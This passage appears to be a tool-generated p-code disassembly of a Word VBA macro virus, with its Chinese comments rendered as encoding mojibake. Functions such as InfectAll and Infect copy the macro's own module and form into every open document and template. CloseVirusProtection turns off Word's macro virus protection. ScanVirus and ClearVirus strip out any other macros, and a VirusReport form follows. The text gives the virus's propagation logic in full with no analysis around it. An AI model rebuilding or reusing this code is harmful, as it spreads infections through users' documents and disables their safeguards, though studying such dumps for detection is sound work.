' 	Ld AutoDotFile 
' 	ArgsCall Kill 0x0001 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	EndSub 
' Line #41:
' 	QuoteRem 0x0000 0x0036 "´ÓÖ¸¶¨ÎÄ¼þÖÐÏòËùÓÐ´ò¿ªÎÄµµ¼°Ä£°åÖÐ¸´ÖÆ±¾³ÌÐò´úÂë¼°Ä£¿é"
' Line #42:
' 	FuncDefn (Public Function InfectAll() As Boolean)
' Line #43:
' 	Dim 
' 	VarDefn myDoc
' 	VarDefn myTemp (As Template)
' Line #44:
' 	QuoteRem 0x0004 0x0018 "Ïò´ò¿ªµÄÎÄµµÖÐÐ´Èë±¾´úÂë"
' Line #45:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #46:
' 	Ld myDoc 
' 	ArgsCall Infect 0x0001 
' Line #47:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' 	QuoteRem 0x0004 0x0016 "ÏòWORDÄ£°åÖÐÐ´Èë±¾´úÂë"
' Line #49:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #50:
' 	Ld myTemp 
' 	ArgsCall Infect 0x0001 
' Line #51:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	NextVar 
' Line #52:
' 	LitVarSpecial (True)
' 	St InfectAll 
' Line #53:
' 	EndFunc 
' Line #54:
' 	QuoteRem 0x0000 0x0028 "Çå³ýËùÓÐ´ò¿ªÎÄµµ¼°Ä£°åÖÐµÄ²¡¶¾Ä£¿é¼°´úÂë"
' Line #55:
' 	FuncDefn (Public Function ClearVirus() As Boolean)
' Line #56:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #57:
' 	Dim 
' 	VarDefn myDoc
' 	VarDefn myTemp (As Template)
' Line #58:
' 	Dim 
' 	VarDefn Cleared (As Boolean)
' Line #59:
' Line #60:
' 	LitVarSpecial (True)
' 	St ClearVirus 
' Line #61:
' 	QuoteRem 0x0004 0x0012 "¼ì²éËùÓÐÎÄµµ²¢Çå³ý"
' Line #62:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #63:
' 	Ld myDoc 
' 	ArgsLd ClearDocument 0x0001 
' 	St Cleared 
' Line #64:
' 	Ld Cleared 
' 	Not 
' 	IfBlock 
' Line #65:
' 	LitStr 0x0020 "²¡¶¾Çå³ý¹¤×÷²»³É¹¦£¬Çë¼ì²éÔ­Òò¡£"
' 	Ld vbOKOnly 
' 	Ld myDoc 
' 	MemLd New 
' 	ArgsCall MsgBox 0x0003 
' Line #66:
' 	LitVarSpecial (False)
' 	St ClearVirus 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	NextVar 
' Line #69:
' 	QuoteRem 0x0004 0x0012 "¼ì²éËùÓÐÄ£°å²¢Çå³ý"
' Line #70:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #71:
' 	Ld myTemp 
' 	ArgsLd ClearDocument 0x0001 
' 	St Cleared 
' Line #72:
' 	Ld Cleared 
' 	Not 
' 	IfBlock 
' Line #73:
' 	LitStr 0x0020 "²¡¶¾Çå³ý¹¤×÷²»³É¹¦£¬Çë¼ì²éÔ­Òò¡£"
' 	Ld vbOKOnly 
' 	Ld myTemp 
' 	MemLd New 
' 	ArgsCall MsgBox 0x0003 
' Line #74:
' 	LitVarSpecial (False)
' 	St ClearVirus 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	NextVar 
' Line #77:
' 	EndFunc 
' Line #78:
' 	QuoteRem 0x0000 0x0048 "¼ì²éËùÓÐ´ò¿ªµÄÎÄµµ¼°Ä£°åÖÐÊÇ·ñÓÐ²¡¶¾´æÔÚ£¬Èç¹ûÓÐ£¬·µ»Ø²¡¶¾ÐÅÏ¢ÃèÊö×Ö·û´®"
' Line #79:
' 	FuncDefn (Public Function ScanVirus() As Boolean)
' Line #80:
' 	Dim 
' 	VarDefn DocsCount (As Integer)
' 	VarDefn i (As Integer)
' 	VarDefn ret (As Integer)
' Line #81:
' 	Dim 
' 	VarDefn myStr (As String)
' Line #82:
' 	Dim 
' 	VarDefn myDoc
' 	VarDefn myTemp (As Template)
' Line #83:
' Line #84:
' 	LitVarSpecial (False)
' 	St ScanVirus 
' Line #85:
' 	LitStr 0x0000 ""
' 	St pVirusReport 
' Line #86:
' 	QuoteRem 0x0004 0x001E "¼ì²éËùÓÐ´ò¿ªµÄÎÄµµÖÐÊÇ·ñÓÐ²¡¶¾"
' Line #87:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #88:
' 	Ld myDoc 
' 	ArgsLd ScanDocument 0x0001 
' 	St ret 
' Line #89:
' 	Ld ret 
' 	SelectCase 
' Line #90:
' 	Ld cOK 
' 	Case 
' 	Ld cDocProtected 
' 	Case 
' 	CaseDone 
' Line #91:
' 	Ld cDocHasModuleElse 
' 	Case 
' 	Ld cDocHasCodeElse 
' 	Case 
' 	Ld cDocHasAllElse 
' 	Case 
' 	CaseDone 
' Line #92:
' 	LitVarSpecial (True)
' 	St ScanVirus 
' Line #93:
' 	CaseElse 
' Line #94:
' 	LitStr 0x002C "º¯ÊýScanDocument·µ»Ø´íÎó´úÂë£¬ÏµÍ³ÎÞ·¨Ê¶±ð¡£"
' 	Ld vbOKOnly 
' 	LitStr 0x0008 "ÏµÍ³³ö´í"
' 	ArgsCall MsgBox 0x0003 
' Line #95:
' 	EndSelect 
' Line #96:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	NextVar 
' Line #97:
' 	QuoteRem 0x0004 0x000C "¼ì²éËùÓÐÄ£°å"
' Line #98:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #99:
' 	Ld myTemp 
' 	ArgsLd ScanDocument 0x0001 
' 	St ret 
' Line #100:
' 	Ld ret 
' 	SelectCase 
' Line #101:
' 	Ld cOK 
' 	Case 
' 	Ld cDocProtected 
' 	Case 
' 	CaseDone 
' Line #102:
' 	Ld cDocHasModuleElse 
' 	Case 
' 	Ld cDocHasCodeElse 
' 	Case 
' 	Ld cDocHasAllElse 
' 	Case 
' 	CaseDone 
' Line #103:
' 	LitVarSpecial (True)
' 	St ScanVirus 
' Line #104:
' 	CaseElse 
' Line #105:
' 	LitStr 0x002C "º¯ÊýScanDocument·µ»Ø´íÎó´úÂë£¬ÏµÍ³ÎÞ·¨Ê¶±ð¡£"
' 	Ld vbOKOnly 
' 	LitStr 0x0008 "ÏµÍ³³ö´í"
' 	ArgsCall MsgBox 0x0003 
' Line #106:
' 	EndSelect 
' Line #107:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	NextVar 
' Line #108:
' 	EndFunc 
' Line #109:
' 	QuoteRem 0x0000 0x0016 "¹Ø±ÕWordºê²¡¶¾±£»¤¹¦ÄÜ"
' Line #110:
' 	ConstFuncExpr 
' 	LitVarSpecial (False)
' 	FuncDefn (Public Function CloseVirusProtection(Optional Protected As Boolean))
' Line #111:
' 	Ld Protected 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #112:
' 	EndFunc 
' Line #113:
' 	QuoteRem 0x0000 0x0028 "°Ñ±¾³ÌÐò´úÂë´ÓÒ»¸öÎÄ¼þ¸´ÖÆµ½ÁíÒ»¸öÎÄ¼þÖÐ"
' Line #114:
' 	FuncDefn (Private Function Infect(TargetFile) As Boolean)
' Line #115:
' 	Dim 
' 	VarDefn xItem
' 	VarDefn CommandStr (As String)
' 	VarDefn file (As String)
' Line #116:
' 	Dim 
' 	VarDefn myDoc
' 	VarDefn myTemp (As Template)
' Line #117:
' 	Dim 
' 	VarDefn LinesofCode (As Long)
' 	VarDefn myStr (As String)
' Line #118:
' Line #119:
' 	QuoteRem 0x0004 0x0014 "¼ì²é²ÎÊýÀàÐÍÊÇ·ñÕýÈ·"
' Line #120:
' 	Ld TargetFile 
' 	ArgsLd TypeName 0x0001 
' 	St myStr 
' Line #121:
' 	Ld myStr 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	Ld myStr 
' 	LitStr 0x0008 "Template"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #122:
' 	LitStr 0x000C "Ê¹ÓÃÊý¾ÝÀàÐÍ"
' 	Ld myStr 
' 	Add 
' 	LitStr 0x0036 "µ÷ÓÃº¯ÊýInfect£¬ÏµÍ³Ö»ÔÊÐíÊ¹ÓÃDocument¼°TemplateÀàÐÍ¡£"
' 	Add 
' 	Ld vbOKOnly 
' 	LitStr 0x0008 "ÏµÍ³´íÎó"
' 	ArgsCall MsgBox 0x0003 
' Line #123:
' 	LitVarSpecial (False)
' 	St Infect 
' Line #124:
' 	ExitFunc 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	LitVarSpecial (True)
' 	St Infect 
' Line #127:
' 	Ld TargetFile 
' 	MemLd New 
' 	Ld ThisDocument 
' 	MemLd New 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' 	QuoteRem 0x003E 0x0024 "Ä¿±êÎÄ¼þÓëÔ´ÎÄ¼þÏàÍ¬Ê±²»Ö´ÐÐÐ´Èë²Ù×÷"
' Line #128:
' 	Ld TargetFile 
' 	ArgsLd Infected 0x0001 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' 	QuoteRem 0x002F 0x001A "Ä¿±êÎÄ¼þÒÑ¾­´æÔÚ±¾³ÌÐò´úÂë"
' Line #129:
' 	Ld TargetFile 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' 	QuoteRem 0x003A 0x0020 "Ä¿±êÎÄ¼þ±»±£»¤£¬²»ÄÜÖ´ÐÐÐ´Èë²Ù×÷"
' Line #130:
' 	LitVarSpecial (False)
' 	St Infect 
' Line #131:
' Line #132:
' 	QuoteRem 0x0004 0x0026 "Çå³ýÄ¿±êÎÄµµÖÐÒÑ¾­´æÔÚµÄÆäËûÄ£¿é¼°´úÂë"
' Line #133:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	Ld TargetFile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #134:
' 	Ld xItem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #135:
' 	Ld xItem 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St LinesofCode 
' Line #136:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Ld xItem 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #137:
' 	ElseBlock 
' Line #138:
' 	Ld xItem 
' 	Ld TargetFile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #139:
' 	EndIfBlock 
' Line #140:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	NextVar 
' Line #141:
' Line #142:
' 	QuoteRem 0x0004 0x001C "ÏòÎÄµµÖÐÐ´Èë±¾³ÌÐò´úÂë¼°Ä£¿é"
' Line #143:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld cMyModule 
' 	Add 
' 	Ld TargetFile 
' 	MemLd FullName 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld cMyModule 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0002 
' Line #144:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld cMyUserForm 
' 	Add 
' 	Ld TargetFile 
' 	MemLd FullName 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld cMyUserForm 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0002 
' Line #145:
' Line #146:
' 	QuoteRem 0x0004 0x0047 " ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^"
' Line #147:
' Line #148:
' 	QuoteRem 0x0004 0x0049 "¸Ã³ÌÐò¶ÎÈç¹û·ÅÔÚÇ°Á½¸öÓï¾äÖ®Ç°£¬¾Í»áµ¼ÖÂVBA32.DLL³ÌÐò³öÏÖÖÂÃü´íÎó¶øËÀ»ú£¬"
' Line #149:
' 	QuoteRem 0x0004 0x002E "ÇîÎÒÖ®±ÏÉú±à³Ì¾­Ñé£¬²»ÖªºÎ¹Ê£¬ÌìÄÄ£¡ÌìÀíºÎÔÚ£¿"
' Line #150:
' Line #151:
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St LinesofCode 
' Line #152:
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St myStr 
' Line #153:
' 	LitDI2 0x0001 
' 	Ld myStr 
' 	LitDI2 0x0001 
' 	Ld TargetFile 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #154:
' Line #155:
' 	LitVarSpecial (True)
' 	St Infect 
' Line #156:
' 	EndFunc 
' Line #157:
' 	QuoteRem 0x0000 0x0022 "¼ì²éÖ¸¶¨ÎÄµµÖÐÊÇ·ñÒÑ¾­ÓÐ±¾³ÌÐò´úÂë"
' Line #158:
' 	FuncDefn (Private Function Infected(TargetFile))
' Line #159:
' 	Dim 
' 	VarDefn xItem
' 	VarDefn LinesofCode (As Integer)
' Line #160:
' 	Dim 
' 	VarDefn HasVirus (As Integer)
' Line #161:
' 	Dim 
' 	VarDefn myType (As String)
' Line #162:
' Line #163:
' 	Ld TargetFile 
' 	ArgsLd TypeName 0x0001 
' 	St myType 
' Line #164:
' 	Ld myType 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	Ld myType 
' 	LitStr 0x0008 "Template"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #165:
' 	LitStr 0x000C "Ê¹ÓÃÊý¾ÝÀàÐÍ"
' 	Ld myType 
' 	Add 
' 	LitStr 0x0038 "µ÷ÓÃº¯ÊýInfected£¬ÏµÍ³Ö»ÔÊÐíÊ¹ÓÃDocument¼°TemplateÀàÐÍ¡£"
' 	Add 
' 	Ld vbOKOnly 
' 	LitStr 0x0008 "ÏµÍ³´íÎó"
' 	ArgsCall MsgBox 0x0003 
' Line #166:
' 	LitVarSpecial (True)
' 	St Infected 
' Line #167:
' 	ExitFunc 
' Line #168:
' 	EndIfBlock 
' Line #169:
' Line #170:
' 	QuoteRem 0x0004 0x0016 "¼ì²éÄ¿±êÎÄµµÊÇ·ñ±»±£»¤"
' Line #171:
' 	Ld TargetFile 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	IfBlock 
' Line #172:
' 	LitVarSpecial (True)
' 	St Infected 
' Line #173:
' 	ExitFunc 
' Line #174:
' 	EndIfBlock 
' Line #175:
' Line #176:
' 	QuoteRem 0x0004 0x0040 "µ±ThisDocument,myModule,myUserForm¾ù´æÔÚÊ±£¬±íÊ¾¸ÃÎÄ¼þÒÑ¾­±»¸ÐÈ¾"
' Line #177:
' 	LitDI2 0x0000 
' 	St HasVirus 
' Line #178:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	Ld TargetFile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #179:
' 	Ld xItem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #180:
' 	Ld xItem 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St LinesofCode 
' Line #181:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	Ld cMyID 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xItem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #182:
' 	Ld HasVirus 
' 	LitDI2 0x0001 
' 	Or 
' 	St HasVirus 
' Line #183:
' 	EndIfBlock 
' Line #184:
' 	Ld xItem 
' 	MemLd New 
' 	Ld cMyModule 
' 	Eq 
' 	ElseIfBlock 
' Line #185:
' 	Ld HasVirus 
' 	LitDI2 0x0002 
' 	Or 
' 	St HasVirus 
' Line #186:
' 	Ld xItem 
' 	MemLd New 
' 	Ld cMyUserForm 
' 	Eq 
' 	ElseIfBlock 
' Line #187:
' 	Ld HasVirus 
' 	LitDI2 0x0004 
' 	Or 
' 	St HasVirus 
' Line #188:
' 	EndIfBlock 
' Line #189:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	NextVar 
' Line #190:
' 	Ld HasVirus 
' 	LitDI2 0x0007 
' 	Eq 
' 	IfBlock 
' Line #191:
' 	LitVarSpecial (True)
' 	St Infected 
' Line #192:
' 	ElseBlock 
' Line #193:
' 	LitVarSpecial (False)
' 	St Infected 
' Line #194:
' 	EndIfBlock 
' Line #195:
' 	EndFunc 
' Line #196:
' 	QuoteRem 0x0000 0x0028 "¼ì²éÖ¸¶¨µÄ´ò¿ªÎÄµµ¼°Ä£°åÖÐÊÇ·ñÓÐ²¡¶¾´æÔÚ"
' Line #197:
' 	FuncDefn (Private Function ScanDocument(myDocOrTemp) As Integer)
' Line #198:
' 	Dim 
' 	VarDefn xItem
' 	VarDefn i (As Integer)
' 	VarDefn myStr (As String)
' Line #199:
' 	Dim 
' 	VarDefn LinesofCode (As Integer)
' Line #200:
' Line #201:
' 	Ld cOK 
' 	St ScanDocument 
' Line #202:
' 	QuoteRem 0x0004 0x0014 "¼ì²é²ÎÊýÀàÐÍÊÇ·ñÕýÈ·"
' Line #203:
' 	Ld myDocOrTemp 
' 	ArgsLd TypeName 0x0001 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	Ld myDocOrTemp 
' 	ArgsLd TypeName 0x0001 
' 	LitStr 0x0008 "Template"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #204:
' 	LitStr 0x0038 "µ÷ÓÃº¯ÊýScanDocumentÖ»ÄÜÊ¹ÓÃDocument¼°TemplateÊý¾ÝÀàÐÍ¡£"
' 	Ld vbOKOnly 
' 	LitStr 0x0008 "ÏµÍ³´íÎó"
' 	ArgsCall MsgBox 0x0003 
' Line #205:
' 	ExitFunc 
' Line #206:
' 	EndIfBlock 
' Line #207:
' 	Ld myDocOrTemp 
' 	MemLd New 
' 	LitStr 0x000A "¼ì²é½á¹û£º"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #208:
' 	QuoteRem 0x0004 0x0016 "¼ì²é³ÌÐòÄ£¿éÊÇ·ñ±»±£»¤"
' Line #209:
' 	Ld myDocOrTemp 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	IfBlock 
' Line #210:
' 	Ld cDocProtected 
' 	St ScanDocument 
' Line #211:
' 	Ld myStr 
' 	LitStr 0x0046 "  ÎÄ¼þÖÐµÄ³ÌÐò´úÂë±»±£»¤£¬ÏµÍ³ÎÞ·¨×Ô¶¯²éÉ±£¬µ«Ò²¿ÉÄÜ´æÔÚ²¡¶¾£¬ÇëÐ¡ÐÄ£¡"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #212:
' 	ExitFunc 
' Line #213:
' 	EndIfBlock 
' Line #214:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	Ld myDocOrTemp 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #215:
' 	Ld xItem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #216:
' 	QuoteRem 0x000C 0x0030 "´Ë²¿·ÖÓÐ´úÂëÊ±£¬Èç¹ûÕÒ²»µ½±¾Ä£¿é±êÖ¾ÔòÈÏ¶¨Îª²¡¶¾"
' Line #217:
' 	Ld xItem 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St LinesofCode 
' Line #218:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	Ld cMyID 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xItem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #219:
' 	Ld ScanDocument 
' 	Ld cDocHasCodeElse 
' 	Or 
' 	St ScanDocument 
' Line #220:
' 	Ld myStr 
' 	LitStr 0x0003 "  <"
' 	Add 
' 	Ld xItem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0023 ">¶ÔÏóÖÐÓÐÆäËû³ÌÐò´æÔÚ£¬´ó¸ÅÊÇ²¡¶¾¡£"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #221:
' 	EndIfBlock 
' Line #222:
' 	Ld xItem 
' 	MemLd New 
' 	Ld cMyModule 
' 	Ne 
' 	Paren 
' 	Ld xItem 
' 	MemLd New 
' 	Ld cMyUserForm 
' 	Ne 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #223:
' 	QuoteRem 0x000C 0x0034 "ÎÄµµÖÐ³ý±¾Ä£¿é´úÂëÖ®Íâ£¬Èç¹û»¹ÓÐÆäËü´úÂëÔòÈÏ¶¨Îª²¡¶¾"
' Line #224:
' 	Ld ScanDocument 
' 	Ld cDocHasModuleElse 
' 	Or 
' 	St ScanDocument 
' Line #225:
' 	Ld myStr 
' 	LitStr 0x000D "  ÓÐÆäËûÄ£¿é<"
' 	Add 
' 	Ld xItem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0017 ">´æÔÚ£¬¼«ÓÐ¿ÉÄÜÊÇ²¡¶¾¡£"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #226:
' 	EndIfBlock 
' Line #227:
' 	StartForVariable 
' 	Next 
' Line #228:
' 	Ld ScanDocument 
' 	Ld cOK 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld myStr 
' 	LitStr 0x0018 "  Ã»ÓÐ²¡¶¾£¬Çë·ÅÐÄÊ¹ÓÃ¡£"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' 	EndIf 
' Line #229:
' 	Ld pVirusReport 
' 	Ld myStr 
' 	Add 
' 	St pVirusReport 
' Line #230:
' 	EndFunc 
' Line #231:
' 	QuoteRem 0x0000 0x002A "Çå³ýÖ¸¶¨µÄ´ò¿ªÎÄµµ¼°Ä£°åÖÐµÄ²¡¶¾Ä£¿é¼°´úÂë"
' Line #232:
' 	FuncDefn (Private Function ClearDocument(myDocOrTemp) As Boolean)
' Line #233:
' 	Dim 
' 	VarDefn xItem
' 	VarDefn LinesofCode (As Integer)
' Line #234:
' Line #235:
' 	LitVarSpecial (False)
' 	St ClearDocument 
' Line #236:
' 	QuoteRem 0x0004 0x0014 "¼ì²é²ÎÊýÀàÐÍÊÇ·ñÕýÈ·"
' Line #237:
' 	Ld myDocOrTemp 
' 	ArgsLd TypeName 0x0001 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	Ld myDocOrTemp 
' 	ArgsLd TypeName 0x0001 
' 	LitStr 0x0008 "Template"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #238:
' 	LitStr 0x0039 "µ÷ÓÃº¯ÊýClearDocumentÖ»ÄÜÊ¹ÓÃDocument¼°TemplateÊý¾ÝÀàÐÍ¡£"
' 	Ld vbOKOnly 
' 	LitStr 0x0008 "ÏµÍ³´íÎó"
' 	ArgsCall MsgBox 0x0003 
' Line #239:
' 	ExitFunc 
' Line #240:
' 	EndIfBlock 
' Line #241:
' 	Ld myDocOrTemp 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	IfBlock 
' Line #242:
' 	LitVarSpecial (True)
' 	St ClearDocument 
' Line #243:
' 	ExitFunc 
' Line #244:
' 	EndIfBlock 
' Line #245:
' 	QuoteRem 0x0004 0x0012 "¼ì²éÎÄµµÊÇ·ñÓÐ²¡¶¾"
' Line #246:
' 	Ld myDocOrTemp 
' 	ArgsLd ScanDocument 0x0001 
' 	IfBlock 
' Line #247:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	Ld myDocOrTemp 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #248:
' 	Ld xItem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #249:
' 	Ld xItem 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St LinesofCode 
' Line #250:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	Ld cMyID 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xItem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #251:
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Ld xItem 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #252:
' 	EndIfBlock 
' Line #253:
' 	Ld xItem 
' 	MemLd New 
' 	Ld cMyModule 
' 	Ne 
' 	Ld xItem 
' 	MemLd New 
' 	Ld cMyUserForm 
' 	Ne 
' 	And 
' 	ElseIfBlock 
' Line #254:
' 	Ld xItem 
' 	Ld myDocOrTemp 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #255:
' 	EndIfBlock 
' Line #256:
' 	StartForVariable 
' 	Next 
' Line #257:
' 	EndIfBlock 
' Line #258:
' 	LitVarSpecial (True)
' 	St ClearDocument 
' Line #259:
' 	EndFunc 
' Macros/VBA/VirusReport - 5159 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' 	QuoteRem 0x0000 0x000C "´°Ìå³ÌÐò´úÂë"
' Line #27:
' 	Option  (Explicit)
' 	QuoteRem 0x0010 0x001C "³ÌÐòÖÐµÄ±äÁ¿±ØÐëÏÈ¶¨ÒåºóÊ¹ÓÃ"
' Line #28:
' 	QuoteRem 0x0000 0x0014 "´ò¿ª´°ÌåÊ±Ö´ÐÐµÄ²Ù×÷"
' Line #29:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #30:
' 	LitVarSpecial (True)
' 	Ld CheckBox1 
' 	MemSt Value 
' Line #31:
' 	Ld pVirusReport 
' 	Ld Information 
' 	MemSt Value 
' Line #32:
' 	ArgsCall Beep 0x0000 
' Line #33:
' 	EndSub 
' Line #34:
' 	QuoteRem 0x0000 0x0016 "¹Ø±Õ´°Ìå£¬²»×÷ÈÎºÎ´¦Àí"
' Line #35:
' 	FuncDefn (Private Sub CommandButtonNothing_Click())
' Line #36:
' 	Dim 
' 	VarDefn ret (As Integer)
' Line #37:
' 	LitStr 0x0056 "Áìµ¼£¬ËäÈ»Äã¿ÉÄÜ»áÅúÆÀÎÒ£¬µ«»¹ÊÇÒª¸æËßÄã£¬ÕâÑù×öÊÇºÜÎ£ÏÕµÄ¡£ÊÇ·ñÕæµÄ²»×ö´¦Àí£¬ÇëÅúÊ¾¡£"
' 	Ld vbYesNo 
' 	Ld vbDefaultButton2 
' 	Add 
' 	LitStr 0x000A "ÔÙ´Î±¨¸æ£¡"
' 	ArgsLd MsgBox 0x0003 
' 	St ret 
' Line #38:
' 	Ld ret 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	EndSub 
' Line #42:
' 	QuoteRem 0x0000 0x0014 "´ò¿ªVisulBasic±à¼­Æ÷"
' Line #43:
' 	FuncDefn (Private Sub CommandButtonOpenVisubasic_Click())
' Line #44:
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' Line #45:
' 	EndSub 
' Line #46:
' 	QuoteRem 0x0000 0x0006 "É±²¡¶¾"
' Line #47:
